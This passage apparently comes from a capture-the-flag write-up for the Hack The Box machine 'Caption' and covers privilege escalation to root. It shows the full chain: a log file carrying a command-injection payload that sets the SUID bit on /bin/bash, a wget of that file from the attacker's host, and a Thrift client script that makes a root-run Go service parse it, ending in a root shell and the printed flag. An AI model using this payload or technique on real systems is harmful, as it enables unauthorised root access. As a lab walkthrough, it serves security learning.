margo       1057  0.0  0.8 1000552 33904 ?       Sl   19:01   0:00  |       \_ python3 copyparty-sfx.py -i 127.0.0.1 -v logs::r
root        1034  0.0  0.1  10348  4056 ?        S    19:01   0:00  \_ /usr/sbin/CRON -f -P
root        1044  0.0  0.0   2892  1004 ?        Ss   19:01   0:00      \_ /bin/sh -c cd /root;/usr/local/go/bin/go run server.go
root        1046  0.0  0.4 1240804 18068 ?       Sl   19:01   0:01          \_ /usr/local/go/bin/go run server.go
root        1397  0.0  0.1 1083448 4412 ?        Sl   19:01   0:00              \_ /tmp/go-build1818911154/b001/exe/server
root        1035  0.0  1.1 177628 46804 ?        Ss   19:01   0:00 /usr/sbin/haproxy -Ws -f /etc/haproxy/haproxy.cfg -p /run/haproxy.pid -S /run/haproxy-master.sock
haproxy     1042  0.4  1.0 180964 41968 ?        Sl   19:01   0:29  \_ /usr/sbin/haproxy -Ws -f /etc/haproxy/haproxy.cfg -p /run/haproxy.pid -S /run/haproxy-master.sock
<--- CUT FOR BREVITY --->
```

So our assumption we originally made for the foothold, could now be the way to escalate our privileges to root.

```c
<--- CUT FOR BREVITY --->
root        1044  0.0  0.0   2892  1004 ?        Ss   19:01   0:00      \_ /bin/sh -c cd /root;/usr/local/go/bin/go run server.go
<--- CUT FOR BREVITY --->
```

To find the `port` on which the `Go server` operated we first checked the `locally availaible ports` and indeed found quite a few.

```c
margo@caption:~$ ss -tulpn
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                 Peer Address:Port                Process                                           
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                        0.0.0.0:*                                                                     
udp                  UNCONN                0                     0                                          0.0.0.0:68                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     50                                         0.0.0.0:8080                                      0.0.0.0:*                    users:(("java",pid=1051,fd=5))                   
tcp                  LISTEN                0                     4096                                     127.0.0.1:9090                                      0.0.0.0:*                                                                     
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                      127.0.0.1:8000                                      0.0.0.0:*                    users:(("python3",pid=1053,fd=3))                
tcp                  LISTEN                0                     1024                                     127.0.0.1:3923                                      0.0.0.0:*                    users:(("python3",pid=1057,fd=3))                
tcp                  LISTEN                0                     10                                       127.0.0.1:6082                                      0.0.0.0:*                                                                     
tcp                  LISTEN                0                     1024                                     127.0.0.1:6081                                      0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                        0.0.0.0:22                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     4096                                       0.0.0.0:80                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                           [::]:22                                           [::]:*
```

## Privilege Escalation to root

Our man `mk0` decided that the `privilege escalation` to `root` would be a perfect match for him and nailed it!

From the `source code` of the `Go server binary` we saw that probably `Apache Thrift` was used. So we tested all ports and forwarded port `9090/TCP` to his local machine.

- [https://thrift.apache.org/tutorial/go](https://thrift.apache.org/tutorial/go)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ ssh -i ed_ecdsa_margo -L 9090:127.0.0.1:9090 margo@caption.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Sep 15 05:32:03 AM UTC 2024

  System load:  0.01              Processes:             234
  Usage of /:   71.3% of 8.76GB   Users logged in:       0
  Memory usage: 33%               IPv4 address for eth0: 10.129.194.20
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Sep 14 20:56:58 2024 from 10.10.14.73
margo@caption:~$
```

Then we created a `malicious logfile` which `matched` the `pattern` we found earlier in the `source code` and placed the `command injection`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/serve]
└─$ cat evil.log 
127.0.0.1 "user-agent":"'; chmod u+s /bin/bash #"
```

Next we uploaded the file to `/tmp` on the box.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
margo@caption:/tmp$ wget http://10.10.14.73/evil.log
--2024-09-15 05:34:15--  http://10.10.14.73/evil.log
Connecting to 10.10.14.73:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 49 [application/octet-stream]
Saving to: ‘evil.log’

evil.log                                                   100%[========================================================================================================================================>]      49  --.-KB/s    in 0s      

2024-09-15 05:34:16 (4.00 MB/s) - ‘evil.log’ saved [49/49]
```

Then we created a `log_service.thrift` file on our local machine as well.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ cat log_service.thrift 
namespace go log_service

service LogService {
    string ReadLogFile(1: string filePath)
}
```

To compile it we installed the necessary `dependencies`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ sudo apt-get install thrift-compiler 
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  thrift-compiler
0 upgraded, 1 newly installed, 0 to remove and 332 not upgraded.
Need to get 1461 kB of archives.
After this operation, 4482 kB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 thrift-compiler amd64 0.19.0-2.1+b1 [1461 kB]
Fetched 1461 kB in 0s (3997 kB/s)        
Selecting previously unselected package thrift-compiler.
(Reading database ... 773455 files and directories currently installed.)
Preparing to unpack .../thrift-compiler_0.19.0-2.1+b1_amd64.deb ...
Unpacking thrift-compiler (0.19.0-2.1+b1) ...
Setting up thrift-compiler (0.19.0-2.1+b1) ...
Processing triggers for man-db (2.12.1-3) ...
Processing triggers for kali-menu (2024.3.1) ...
Scanning processes...                                                                                                                                                                                                                       
Scanning linux images...                                                                                                                                                                                                                    

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

And then we compiled the `log_service.thrift` which created a new directory called `gen-py`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ thrift -r --gen py log_service.thrift
```

Inside the `gen-py directory` we created a `client.py` to communicate with the server and to read our `malicious logfile`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Caption/file/gen-py]
└─$ cat client.py 
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    # Set up a transport to the server
    transport = TSocket.TSocket('localhost', 9090)

    # Buffering for performance
    transport = TTransport.TBufferedTransport(transport)

    # Using a binary protocol
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client to use the service
    client = LogService.Client(protocol)

    # Open the connection
    transport.open()

    try:
        # Specify the log file path to process
        log_file_path = "/tmp/evil.log"
        
        # Call the remote method ReadLogFile and get the result
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)
    
    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")

    # Close the transport
    transport.close()

if __name__ == '__main__':
    main()
```

We executed it and and got `code execution` as `root`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Caption/file/gen-py]
└─$ python3 client.py 
Server response: Log file processed
```

```c
margo@caption:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```c
margo@caption:/tmp$ /bin/bash -p
bash-5.1#
```

## root.txt

```c
bash-5.1# cat root.txt 
57d9828d567c457807a9d3546c3dee53
```
